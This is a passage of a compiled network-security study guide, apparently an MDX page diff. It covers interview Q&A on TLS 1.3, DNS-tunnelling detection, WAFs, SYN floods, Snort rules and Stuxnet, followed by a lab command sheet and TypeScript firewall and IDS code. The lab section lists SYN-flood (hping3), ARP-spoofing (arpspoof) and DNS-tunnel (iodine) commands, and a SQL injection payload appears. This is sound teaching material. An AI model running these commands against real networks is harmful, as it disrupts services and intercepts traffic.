+        children: "[IP Header (original)] [ESP Header] [TCP Header] [Payload] [ESP Trailer] [Auth]\n                              ← encrypted →\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Tunnel mode packet:"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "[IP Header (new)] [ESP Header] [IP Header (original)] [TCP] [Payload] [ESP Trailer] [Auth]\n                                          ← encrypted →\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "q17-what-is-the-difference-between-a-reverse-proxy-and-a-forward-proxy-in-network-security",
+      children: "Q17: What is the difference between a reverse proxy and a forward proxy in network security?"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "A17:"
+      }), " A forward proxy sits between clients and the internet. Clients configure their browser/app to use the proxy. The proxy fetches content on behalf of clients, providing anonymity, content filtering, and caching. Used for outbound traffic control (employees → internet). A reverse proxy sits between the internet and servers. Clients connect to the reverse proxy which forwards to backend servers. Used for inbound traffic control (internet → web servers), providing load balancing, SSL termination, WAF, and server anonymity. Nginx is commonly used as both."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "q18-explain-the-tls-13-handshake-and-its-security-improvements-over-tls-12",
+      children: "Q18: Explain the TLS 1.3 handshake and its security improvements over TLS 1.2."
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "A18:"
+      }), " TLS 1.3 handshake (1-RTT for new, 0-RTT for resumed):"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "Client                          Server\n  │                                │\n  │── ClientHello (key_share) ────→│\n  │                                │ Server derives session key\n  │←─ ServerHello + Cert + Finish ─│\n  │ (server handshake encrypted)    │\n  │ Client derives session key      │\n  │── Client Finish (encrypted) ──→│\n  │←── Application Data (HTTP/2) ──│\n\nTotal: 1 round trip (vs 2 in TLS 1.2)\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Improvements over TLS 1.2:"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Removed weak ciphers (RC4, DES, CBC-mode)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Removed compression (CRIME attack)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Removed renegotiation (DoS vector)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Removed static RSA key exchange (no PFS)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Mandatory forward secrecy (ECDHE only)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Encrypted Server Certificate (privacy)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "0-RTT resumption (fast reconnect, but replay risk)"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "q19-what-is-the-role-of-entropy-in-detecting-dns-tunneling",
+      children: "Q19: What is the role of entropy in detecting DNS tunneling?"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "A19:"
+      }), " DNS tunneling encodes data in DNS query subdomains. Normal DNS queries have subdomains matching dictionary words or predictable patterns (e.g., \"www\", \"mail\", \"api\"). Tunneling tools encode binary data as base32/base64, producing high-entropy subdomain labels (e.g., \"3f7a2b9c1d5e8f0a.evil.com\"). Shannon entropy for normal subdomains: 2.0-3.5 bits/char. For tunneling: 4.5-5.5 bits/char. Detection threshold: entropy > 4.0 for subdomains > 30 characters. Example using Python:"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-python",
+        children: "import math, collections\ndef shannon_entropy(s):\n    freq = collections.Counter(s)\n    return -sum(c/len(s) * math.log2(c/len(s)) for c in freq.values())\n\nnormal = shannon_entropy(\"www\")  # ~1.5\ntunnel = shannon_entropy(\"3f7a2b9c1d5e8f0a\")  # ~4.0\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "q20-how-does-sql-injection-bypass-a-packet-filter-firewall-but-not-a-waf",
+      children: "Q20: How does SQL injection bypass a packet filter firewall but not a WAF?"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "A20:"
+      }), " A packet filter inspects Layer 3/4 headers only (IP, port, protocol). It never looks at the HTTP payload. A SQL injection payload like ", (0,jsx_runtime.jsx)(_components.code, {
+        children: "' OR 1=1 --"
+      }), " is inside the HTTP request body, invisible to a packet filter. A WAF inspects the full HTTP request (URI, headers, body). It can detect SQL injection patterns using regex rules (e.g., ModSecurity rule 942100 matching ", (0,jsx_runtime.jsx)(_components.code, {
+        children: "(?i:(?:select|union|insert|delete|update|drop|alter).*)"
+      }), ") and block the request before it reaches the web application server."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "q21-describe-the-full-flow-of-a-ddos-mitigation-using-cloudflare",
+      children: "Q21: Describe the full flow of a DDoS mitigation using Cloudflare."
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "A21:"
+      }), " (1) Traffic arrives at Cloudflare's nearest data center (anycast). (2) Layer 3/4 mitigation drops packets with invalid headers, SYN floods are challenged, and amplification attacks are scrubbed. (3) Layer 7 mitigation: JS challenge verifies browser support, CAPTCHA challenges suspicious IPs, rate limiting per IP/ASN/country, WAF checks HTTP requests for attack signatures, bot management scores each request (1 = human, 100 = automated). (4) Clean traffic is proxied to the origin server over a dedicated tunnel (Argo Tunnel/Cloudflare Tunnel) → the origin IP is never exposed. (5) Analytics provide real-time visibility into dropped vs passed traffic. (6) Under extreme attack (>1 Tbps), Cloudflare's global network distributes the load across 300+ data centers."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "q22-what-is-the-difference-between-8021x-and-mac-authentication-bypass-mab",
+      children: "Q22: What is the difference between 802.1X and MAC Authentication Bypass (MAB)?"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "A22:"
+      }), " 802.1X is a standard for port-based authentication using EAP. The supplicant (client) must support 802.1X (built into modern OS). The client presents credentials (user/password, certificate) to the authenticator (switch/AP), which forwards to RADIUS. MAB is a fallback for devices that do not support 802.1X (printers, IoT sensors, cameras). The switch authenticates based on the device's MAC address against a MAC whitelist on the RADIUS server. MAB is significantly less secure: MAC addresses can be spoofed trivially, and there is no encryption or credential verification."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "q23-explain-the-nist-sp-800-207-zero-trust-architecture-core-components",
+      children: "Q23: Explain the NIST SP 800-207 zero trust architecture core components."
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "A23:"
+      }), " NIST SP 800-207 defines:"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Policy Engine (PE):"
+        }), " The brain → makes allow/deny decisions based on identity, device health, and context. Uses OPA or custom policy."]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Policy Administrator (PA):"
+        }), " Generates session tokens, handles authentication. Issues JWT or mTLS certificates."]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Policy Enforcement Point (PEP):"
+        }), " Gate → enforces the decision. Can be a reverse proxy, API gateway, or network firewall."]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Identity Provider (IdP):"
+        }), " Authenticates users (Keycloak, Azure AD)."]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Device Agent:"
+        }), " Reports device health (osquery, MDM agent)."]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Data Plane:"
+        }), " Encrypts all traffic end-to-end (mTLS, WireGuard)."]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Communication flow: User → PEP (requests access) → PE evaluates (identity + device + context) → PA issues token → PEP allows access."
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "q24-how-does-the-wpa3-sae-handshake-prevent-offline-dictionary-attacks",
+      children: "Q24: How does the WPA3 SAE handshake prevent offline dictionary attacks?"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "A24:"
+      }), " WPA2 uses a 4-Way Handshake where the PMK is directly derived from the PSK. An attacker captures the 4 messages and cracks the PSK offline. WPA3 SAE (Dragonfly handshake) uses a zero-knowledge proof: both parties prove knowledge of the password without revealing it. The sequence: (1) Both parties derive a password element from the password using a hash-to-curve function. (2) Each generates an ephemeral private key and sends a commitment (hash of scalar + element). (3) Each sends a confirm value (proof of knowledge). (4) Both parties independently derive the same PMK. Without the password, an attacker cannot compute the correct confirm value. Each guess requires a fresh SAE exchange with the real AP → offline brute force is impossible."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "q25-what-is-the-tcp-three-way-handshake-and-how-does-it-enable-syn-flood-attacks",
+      children: "Q25: What is the TCP three-way handshake and how does it enable SYN flood attacks?"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "A25:"
+      }), " The TCP three-way handshake establishes a connection:"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Client sends SYN (seq=x)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Server responds with SYN-ACK (seq=y, ack=x+1)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Client sends ACK (seq=x+1, ack=y+1)"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "In a SYN flood, the attacker sends thousands of SYN packets with spoofed source IPs. The server allocates memory (TCB → Transmission Control Block) for each half-open connection and sends SYN-ACK to the spoofed IP (which never responds). The backlog queue fills (typically 1024 entries). The server cannot accept new connections. Mitigation: SYN cookies encode connection info in the SYN-ACK sequence number (no memory allocated until ACK received) → the server only allocates TCB on ACK completion."
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "q26-compare-snort-and-suricata-rule-languages-when-would-you-use-each",
+      children: "Q26: Compare Snort and Suricata rule languages. When would you use each?"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "A26:"
+      }), " Both support the same rule syntax (Snort rules work in Suricata). Key differences:"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Performance:"
+        }), " Suricata is multi-threaded, Snort is single-threaded. Suricata handles 10+ Gbps on modern hardware; Snort struggles above 2-3 Gbps."]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Protocol parsing:"
+        }), " Suricata has built-in HTTP, TLS, DNS, SMB, SSH protocol parsers (application-layer events). Snort relies on PCRE for application detection."]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "File extraction:"
+        }), " Suricata can extract files from HTTP, SMB, SMTP streams natively."]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Output:"
+        }), " Suricata produces structured JSON (eve.json) for ELK; Snort uses syslog-like format."]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Use case:"
+        }), " Use Snort for small networks (<1 Gbps) or if Snort rules are your standard. Use Suricata for high-throughput, multi-tenant, or when deep protocol inspection is needed."]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "q27-explain-how-bgp-route-leaks-happen-and-the-difference-from-bgp-hijacking",
+      children: "Q27: Explain how BGP route leaks happen and the difference from BGP hijacking."
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "A27:"
+      }), " BGP hijacking is malicious → an unauthorized AS deliberately announces prefixes it does not own (e.g., Pakistan Telecom announcing YouTube's prefix). BGP route leaks are accidental → a misconfigured AS announces learned routes to other peers when it should only announce its own. Example: AS A learns route to prefix P from its upstream, then announces P to AS B (its other peer) as if AS A owns P. AS B propagates P, causing traffic destined for P to be routed through AS A first. Route leaks are typically unintentional configuration errors. Both are mitigated by prefix filtering, max-prefix limits, and RPKI."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "q28-describe-the-contents-of-the-snortsuricata-rule-header-and-options",
+      children: "Q28: Describe the contents of the Snort/Suricata rule header and options."
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "A28:"
+      }), " Snort rule header: ", (0,jsx_runtime.jsx)(_components.code, {
+        children: "[action] [protocol] [src_ip] [src_port] -> [dst_ip] [dst_port]"
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Actions: alert (log alert), log (log packet), pass (ignore), drop (IPS: block + log), reject (IPS: block + RST/ICMP)."
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Options (partial list):"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.code, {
+          children: "msg:"
+        }), " → Alert message"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.code, {
+          children: "sid:"
+        }), " → Unique rule ID (Snort: <1M reserved, 1M+ custom; Suricata: 2M+ custom)"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.code, {
+          children: "rev:"
+        }), " → Revision number"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.code, {
+          children: "classtype:"
+        }), " → Attack category (trojan-activity, attempted-admin, web-application-attack)"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.code, {
+          children: "reference:"
+        }), " → External reference (cve, url, arachnids)"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.code, {
+          children: "content:"
+        }), " → Byte pattern matching (", (0,jsx_runtime.jsx)(_components.code, {
+          children: "content:\"|AABB|\""
+        }), " for hex, ", (0,jsx_runtime.jsx)(_components.code, {
+          children: "content:\"text\""
+        }), " for ASCII)"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.code, {
+          children: "pcre:"
+        }), " → Perl-compatible regex"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.code, {
+          children: "flow:"
+        }), " → to_server, from_server, established, stateless"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.code, {
+          children: "threshold:"
+        }), " → Alert frequency control (type both/track by_src/count 5/seconds 60)"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.code, {
+          children: "dsize:"
+        }), " → Payload size check"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.code, {
+          children: "fileext:"
+        }), " → File extension match (Suricata)"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.code, {
+          children: "tls.sni:"
+        }), " → TLS SNI match (Suricata)"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.code, {
+          children: "metadata:"
+        }), " → Custom key-value pairs"]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "q29-what-network-security-controls-would-you-implement-at-each-layer-of-the-osi-model",
+      children: "Q29: What network security controls would you implement at each layer of the OSI model?"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "A29:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "L1 (Physical):"
+        }), " Locked server rooms, CCTV, port security, tamper-proof cabling"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "L2 (Data Link):"
+        }), " 802.1X, DHCP snooping, Dynamic ARP Inspection, MAC port security, VLANs, STP BPDU guard"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "L3 (Network):"
+        }), " Ingress/egress filtering (BCP 38), IPsec, ACLs, uRPF, VRF"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "L4 (Transport):"
+        }), " Stateful firewall, SYN cookies, TCP timestamps, conntrack limits"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "L5-6 (Session/Presentation):"
+        }), " TLS 1.3, mTLS, session timeout, re-authentication"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "L7 (Application):"
+        }), " WAF, RASP, API gateway rate limiting, input validation, Bot management"]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "q30-explain-the-full-stuxnet-attack-chain-and-why-it-was-so-significant",
+      children: "Q30: Explain the full Stuxnet attack chain and why it was so significant."
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "A30:"
+      }), " Stuxnet (2010) was the first known cyber weapon → a nation-state (US/Israel) attack on Iranian nuclear centrifuges. Attack chain: (1) USB infection via social engineering or supply chain compromise. (2) Exploit MS10-046 (LNK vulnerability) for auto-execution. (3) MS10-061 print spooler escalation for SYSTEM privileges. (4) MS08-067 (Server Service) for network propagation. (5) Spread across air-gapped network via USB and network shares. (6) Target discovery: looks for Siemens Step 7 software on Windows. (7) Rootkit: hides modified PLC code from operators. (8) PLC sabotage: two attack profiles → rapid frequency oscillation destroys centrifuges; long-duration frequency changes accelerate bearing wear. (9) Man-in-the-middle: replays normal sensor data while centrifuges self-destruct. Operators see \"normal operations\" as IR-1 centrifuges tear themselves apart. Four zero-day exploits used (unprecedented). Significance: proved air-gaps are not absolute, changed international cyber warfare policy, demonstrated kinetic effects via cyber means, led to NIST SP 800-82 for industrial control system security."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "section-26-final-comprehensive-reference--all-tools-in-one-lab",
+      children: "Section 26: Final Comprehensive Reference → All Tools in One Lab"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "261-complete-network-security-test-lab",
+      children: "26.1 Complete Network Security Test Lab"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# Test lab architecture:\n# Kali (attacker) ──eth0── switch ──eth0── Ubuntu Server (target)\n# 192.168.1.100           |          192.168.1.1\n#                   eth0\n#                        ── Internet (simulated via iptables NAT)\n\n# 1. Reconnaissance\nnmap -sS -sV -O -A 192.168.1.1\n\n# 2. Vulnerability scan\nnmap --script vuln 192.168.1.1\n\n# 3. SYN flood test\nhping3 -S -p 80 --flood 192.168.1.1\n\n# 4. Detect SYN flood (on target)\ntcpdump -i eth0 \"tcp[tcpflags] & (tcp-syn) != 0 and tcp[tcpflags] & (tcp-ack) == 0\" -c 1000\n\n# 5. ARP spoofing (from attacker)\narpspoof -i eth0 -t 192.168.1.1 -r 192.168.1.100\n\n# 6. Detect ARP spoof (on target)\narpwatch -i eth0\n\n# 7. Capture all traffic\ntcpdump -i eth0 -w lab-capture.pcap\n\n# 8. Analyze with Suricata\nsuricata -r lab-capture.pcap\n\n# 9. View alerts\ncat /var/log/suricata/eve.json | jq '. | select(.event_type==\"alert\") | {timestamp: .timestamp, alert: .alert.signature, src: .src_ip, dst: .dest_ip}'\n\n# 10. DNS tunneling test\niodine -f -P password 10.0.0.1 tunnel.example.com\n\n# 11. Detect DNS tunneling (entropy analysis)\ntshark -r capture.pcap -Y \"dns.qry.name\" -T fields -e dns.qry.name | awk '{print length, $0}' | sort -rn | head -10\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "typescript-implementations",
+      children: "TypeScript Implementations"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "1-firewall-rule-analyzer",
+      children: "1. Firewall Rule Analyzer"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "The following TypeScript class implements a firewall rule analyzer that identifies security misconfigurations including shadowed rules, overly permissive rules, and duplicate entries."
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-typescript",
+        children: "interface FirewallRule {\n  sourceIp: string;\n  destIp: string;\n  destPort: number;\n  protocol: 'tcp' | 'udp';\n  action: 'allow' | 'deny';\n}\n\nclass FirewallAnalyzer {\n  private rules: FirewallRule[];\n\n  constructor(rules: FirewallRule[]) {\n    this.rules = rules;\n  }\n\n  analyze(): {\n    openPorts: Set<string>;\n    shadowedRules: FirewallRule[];\n    overlyPermissive: FirewallRule[];\n    recommendations: string[];\n  } {\n    const openPorts = new Set<string>();\n    const shadowedRules: FirewallRule[] = [];\n    const overlyPermissive: FirewallRule[] = [];\n    const recommendations: string[] = [];\n\n    // Check for overly permissive any-any-allow rules\n    for (const rule of this.rules) {\n      if (rule.sourceIp === '0.0.0.0/0' && rule.destIp === '0.0.0.0/0' && rule.action === 'allow') {\n        overlyPermissive.push(rule);\n        recommendations.push(\n          `Rule allowing any source to any destination on port ${rule.destPort}/${rule.protocol} is overly permissive. ` +\n          `Consider restricting to specific source/destination ranges.`\n        );\n      }\n    }\n\n    // Collect all allowed ports\n    const allowedRules = this.rules.filter(r => r.action === 'allow');\n    for (const rule of allowedRules) {\n      openPorts.add(`${rule.destPort}/${rule.protocol.toUpperCase()}`);\n    }\n\n    // Detect shadowed rules: a deny rule placed after a broader allow is never evaluated\n    for (let i = 0; i < this.rules.length; i++) {\n      for (let j = i + 1; j < this.rules.length; j++) {\n        if (this.rules[i].action === 'allow' && this.rules[j].action === 'deny') {\n          if (this.isSupersetOrEqual(this.rules[i], this.rules[j])) {\n            shadowedRules.push(this.rules[j]);\n            recommendations.push(\n              `Rule #${j + 1} (deny) is shadowed by earlier rule #${i + 1} (allow). ` +\n              `Reorder or remove the shadowed rule to ensure intended policy.`\n            );\n          }\n        }\n      }\n    }\n\n    // Identify duplicate (redundant) rules\n    const seen = new Set<string>();\n    for (let i = 0; i < this.rules.length; i++) {\n      const key = `${this.rules[i].sourceIp}|${this.rules[i].destIp}|${this.rules[i].destPort}|${this.rules[i].protocol}|${this.rules[i].action}`;\n      if (seen.has(key)) {\n        recommendations.push(`Rule #${i + 1} is a duplicate of an earlier rule — consider removing it.`);\n      }\n      seen.add(key);\n    }\n\n    return { openPorts, shadowedRules, overlyPermissive, recommendations };\n  }\n\n  private isSupersetOrEqual(a: FirewallRule, b: FirewallRule): boolean {\n    if (a.protocol !== b.protocol) return false;\n    if (a.destPort !== b.destPort) return false;\n    // If rule a has a broader source than rule b, it shadows it\n    return a.sourceIp === '0.0.0.0/0' || a.sourceIp === b.sourceIp;\n  }\n}\n\n// Example usage\nconst rules: FirewallRule[] = [\n  { sourceIp: '0.0.0.0/0', destIp: '10.0.1.10', destPort: 80, protocol: 'tcp', action: 'allow' },\n  { sourceIp: '0.0.0.0/0', destIp: '0.0.0.0/0', destPort: 80, protocol: 'tcp', action: 'allow' },\n  { sourceIp: '10.0.1.0/24', destIp: '10.0.2.10', destPort: 22, protocol: 'tcp', action: 'deny' },\n  { sourceIp: '0.0.0.0/0', destIp: '10.0.2.10', destPort: 22, protocol: 'tcp', action: 'deny' },\n  { sourceIp: '0.0.0.0/0', destIp: '10.0.2.10', destPort: 22, protocol: 'tcp', action: 'deny' },\n];\n\nconst analyzer = new FirewallAnalyzer(rules);\nconst result = analyzer.analyze();\n\nconsole.log('Open ports:', [...result.openPorts].join(', '));\nconsole.log('Shadowed rules:', result.shadowedRules.length);\nconsole.log('Overly permissive rules:', result.overlyPermissive.length);\nconsole.log('Recommendations:');\nresult.recommendations.forEach(r => console.log(`  • ${r}`));\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "2-idsips-rule-engine",
+      children: "2. IDS/IPS Rule Engine"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "This TypeScript engine simulates an intrusion detection/prevention system with rules for SYN flood detection, port scan detection, and SQL injection detection in packet payloads."
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-typescript",
+        children: "interface Packet {\n  sourceIp: string;\n  destIp: string;\n  sourcePort: number;\n  destPort: number;\n  protocol: string;\n  payload: string;\n  flags: string[];\n}\n\ninterface IDSRule {\n  id: string;\n  signature: string;\n  severity: 'low' | 'medium' | 'high' | 'critical';\n  action: 'alert' | 'block' | 'log';\n}\n\ninterface Alert {\n  ruleId: string;\n  signature: string;\n  severity: string;\n  action: string;\n  sourceIp: string;\n  destIp: string;\n  timestamp: Date;\n  description: string;\n}\n\nclass IDSEngine {\n  private rules: IDSRule[];\n  private connectionTracker: Map<string, number> = new Map();\n  private synCounts: Map<string, number> = new Map();\n\n  constructor(rules: IDSRule[]) {\n    this.rules = rules;\n  }\n\n  matchRules(packets: Packet[]): Alert[] {\n    const alerts: Alert[] = [];\n\n    for (const packet of packets) {\n      for (const rule of this.rules) {\n        const alert = this.evaluateRule(packet, rule);\n        if (alert) {\n          alerts.push(alert);\n          if (rule.action === 'block') {\n            console.log(`[BLOCKED] Packet from ${packet.sourceIp} matched rule ${rule.id}`);\n          }\n        }\n      }\n    }\n    return alerts;\n  }\n\n  private evaluateRule(packet: Packet, rule: IDSRule): Alert | null {\n    switch (rule.signature) {\n      case 'SYN_FLOOD': {\n        if (packet.flags.includes('SYN') && !packet.flags.includes('ACK')) {\n          const count = (this.synCounts.get(packet.sourceIp) || 0) + 1;\n          this.synCounts.set(packet.sourceIp, count);\n          if (count > 100) {\n            return {\n              ruleId: rule.id,\n              signature: rule.signature,\n              severity: rule.severity,\n              action: rule.action,\n              sourceIp: packet.sourceIp,\n              destIp: packet.destIp,\n              timestamp: new Date(),\n              description: `SYN flood suspected: ${count}+ SYNs from ${packet.sourceIp} (threshold: 100)`,\n            };\n          }\n        }\n        break;\n      }\n\n      case 'PORT_SCAN': {\n        const key = `${packet.sourceIp}→${packet.destIp}`;\n        const count = (this.connectionTracker.get(key) || 0) + 1;\n        this.connectionTracker.set(key, count);\n        if (count > 50) {\n          return {\n            ruleId: rule.id,\n            signature: rule.signature,\n            severity: rule.severity,\n            action: rule.action,\n            sourceIp: packet.sourceIp,\n            destIp: packet.destIp,\n            timestamp: new Date(),\n            description: `Port scan detected: ${count} connections from ${packet.sourceIp} to ${packet.destIp}`,\n          };\n        }\n        break;\n      }\n\n      case 'SQL_INJECTION': {\n        const sqlPatterns = [\n          /(\\bUNION\\b.*\\bSELECT\\b)/i,\n          /(\\bSELECT\\b.*\\bFROM\\b)/i,\n          /(\\bDROP\\b.*\\bTABLE\\b)/i,\n          /('|--|\\bOR\\b.*=.*\\bOR\\b)/i,\n          /(\\bINSERT\\b.*\\bINTO\\b)/i,\n          /(\\bEXEC\\b|\\bXP_\\b)/i,\n          /(\\bWAITFOR\\b.*\\bDELAY\\b)/i,\n          /('.+')/,\n        ];\n        for (const pattern of sqlPatterns) {\n          if (pattern.test(packet.payload)) {\n            return {\n              ruleId: rule.id,\n              signature: rule.signature,\n              severity: rule.severity,\n              action: rule.action,\n              sourceIp: packet.sourceIp,\n              destIp: packet.destIp,\n              